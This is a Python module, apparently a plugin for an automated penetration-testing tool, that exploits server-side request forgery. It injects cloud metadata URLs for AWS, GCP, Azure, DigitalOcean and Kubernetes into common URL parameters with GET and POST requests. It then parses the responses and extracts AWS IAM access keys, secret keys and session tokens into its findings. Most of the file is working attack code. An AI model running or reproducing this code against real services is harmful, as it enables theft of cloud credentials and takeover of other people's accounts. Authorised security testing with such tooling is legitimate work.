"""
Cloud Metadata Exploitation — SSRF to cloud instance metadata endpoints.

Tests:
1. AWS IMDSv1/v2: http://169.254.169.254/latest/meta-data/
2. GCP: http://metadata.google.internal/computeMetadata/v1/
3. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
4. DigitalOcean: http://169.254.169.254/metadata/v1/
5. Kubernetes: http://kubernetes.default.svc/
6. Docker: http://unix:///var/run/docker.sock

Strategy: Inject cloud metadata URLs as SSRF payloads and check for credential leakage.
"""

import asyncio
import json
import re
from typing import Dict, List, Any, Optional
from skills.base import BaseSkill, SkillResult


# Cloud metadata endpoints with expected responses
METADATA_ENDPOINTS = {
    "aws": [
        {"url": "http://169.254.169.254/latest/meta-data/", "check": "ami-id", "severity": "high"},
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "check": "role", "severity": "critical"},
        {"url": "http://169.254.169.254/latest/meta-data/identity/credentials/ec2/security-credentials/", "check": "AccessKeyId", "severity": "critical"},
        {"url": "http://169.254.169.254/latest/user-data", "check": "base64", "severity": "critical"},
        {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "check": "accountId", "severity": "high"},
    ],
    "gcp": [
        {"url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true", "check": "project", "severity": "high"},
        {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "check": "access_token", "severity": "critical"},
        {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "check": "project", "severity": "medium"},
    ],
    "azure": [
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "check": "subscriptionId", "severity": "high"},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "check": "access_token", "severity": "critical"},
    ],
    "digitalocean": [
        {"url": "http://169.254.169.254/metadata/v1/", "check": "droplet_id", "severity": "high"},
        {"url": "http://169.254.169.254/metadata/v1/user-data", "check": "", "severity": "critical"},
    ],
    "kubernetes": [
        {"url": "http://kubernetes.default.svc/api/v1/namespaces", "check": "items", "severity": "critical"},
        {"url": "http://kubernetes.default.svc/api/v1/secrets", "check": "items", "severity": "critical"},
    ],
}

# SSRF parameters to inject metadata URLs
SSRF_PARAMS = [
    "url", "uri", "link", "href", "src", "target", "redirect",
    "callback", "webhook", "feed", "file", "path", "page",
    "image", "img", "avatar", "icon", "logo", "fetch",
]

# URL encode variants for bypass
def url_encode(s: str) -> str:
    return "".join(f"%{ord(c):02x}" if c.isalnum() else c for c in s)


class CloudMetadataSkill(BaseSkill):
    """
    Cloud metadata exploitation via SSRF.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["cloud_metadata", "ssrf_cloud", "metadata", "cloud"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        target = context.get("target", "")
        urls = context.get("urls", [])
        ssrf_endpoints = context.get("ssrf_endpoints", [])
        
        findings = []
        
        # If we have SSRF endpoints, test them with cloud metadata payloads
        if ssrf_endpoints:
            for endpoint in ssrf_endpoints[:5]:
                cloud_findings = await self._test_cloud_ssrf(endpoint)
                findings.extend(cloud_findings)
        else:
            # Probe common parameters for SSRF
            for url in urls[:5]:
                cloud_findings = await self._probe_ssrf(url)
                findings.extend(cloud_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={"ssrf_endpoints_tested": len(ssrf_endpoints) or len(urls), "cloud_findings": len(findings)},
            next_skills=["validate"],
            confidence=min(len(findings) / 2, 1.0) if findings else 0.0,
        )

    async def _test_cloud_ssrf(self, endpoint: Dict) -> List[Dict]:
        """Test a known SSRF endpoint with cloud metadata URLs."""
        findings = []
        
        url = endpoint.get("url", "")
        param = endpoint.get("param", "")
        
        for cloud_provider, metadata_endpoints in METADATA_ENDPOINTS.items():
            for meta in metadata_endpoints:
                meta_url = meta["url"]
                check = meta["check"]
                severity = meta["severity"]
                
                # Test with direct URL
                result = await self._send_ssrf(url, param, meta_url)
                if result and self._check_metadata_response(result, check):
                    findings.append({
                        "type": "cloud_metadata_access",
                        "url": url,
                        "severity": severity,
                        "confidence": 0.95,
                        "cvss_score": 9.0 if severity == "critical" else 7.5,
                        "evidence": f"{cloud_provider.upper()} metadata accessible via SSRF: {meta_url}",
                        "payload": meta_url,
                        "param": param,
                        "description": f"Cloud instance metadata accessible — {cloud_provider.upper()} credentials potentially exposed",
                        "source_tool": "cloud-metadata",
                    })
                    
                    # If we got IAM credentials, extract them
                    if cloud_provider == "aws" and "iam" in meta_url:
                        creds = self._extract_aws_creds(result)
                        if creds:
                            findings.append({
                                "type": "aws_credentials_exposed",
                                "url": url,
                                "severity": "critical",
                                "confidence": 0.95,
                                "cvss_score": 10.0,
                                "evidence": f"AWS credentials: AccessKeyId={creds.get('AccessKeyId', 'N/A')[:10]}...",
                                "payload": json.dumps(creds),
                                "param": param,
                                "description": "AWS IAM credentials exposed via metadata endpoint",
                                "source_tool": "cloud-metadata",
                            })
        
        return findings

    async def _probe_ssrf(self, url: str) -> List[Dict]:
        """Probe common parameters for SSRF to cloud metadata."""
        findings = []
        
        for param in SSRF_PARAMS[:10]:
            # Test with AWS metadata as canary
            test_url = f"{url}?{param}=" + url_encode("http://169.254.169.254/latest/meta-data/")
            
            try:
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-s", "-i", "--max-time", "10",
                    test_url,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                response = stdout.decode(errors="ignore")
                
                if self._check_metadata_response(response, "ami-id"):
                    findings.append({
                        "type": "ssrf_to_cloud_metadata",
                        "url": url,
                        "severity": "critical",
                        "confidence": 0.9,
                        "cvss_score": 9.5,
                        "evidence": f"SSRF via {param} parameter — AWS metadata accessible",
                        "payload": f"http://169.254.169.254/latest/meta-data/",
                        "param": param,
                        "description": f"Server-Side Request Forgery via {param} — cloud instance metadata exposed",
                        "source_tool": "cloud-metadata",
                    })
                    break  # Found SSRF, no need to test more params
            except Exception:
                continue
        
        return findings

    async def _send_ssrf(self, url: str, param: str, payload: str) -> Optional[str]:
        """Send SSRF payload and return response."""
        try:
            # Try GET parameter
            test_url = f"{url}?{param}=" + url_encode(payload)
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10",
                test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            if response and len(response) > 10:
                return response
            
            # Try POST parameter
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10",
                "-X", "POST",
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "-d", f"{param}={url_encode(payload)}",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode(errors="ignore")
        except Exception:
            return None

    def _check_metadata_response(self, response: str, check: str) -> bool:
        """Check if response contains expected metadata."""
        if not check:
            return len(response) > 50  # Non-empty response
        return check.lower() in response.lower()

    def _extract_aws_creds(self, response: str) -> Optional[Dict]:
        """Extract AWS credentials from metadata response."""
        try:
            creds = json.loads(response)
            return {
                "AccessKeyId": creds.get("AccessKeyId"),
                "SecretAccessKey": creds.get("SecretAccessKey"),
                "Token": creds.get("Token"),
                "Expiration": creds.get("Expiration"),
            }
        except json.JSONDecodeError:
            return None
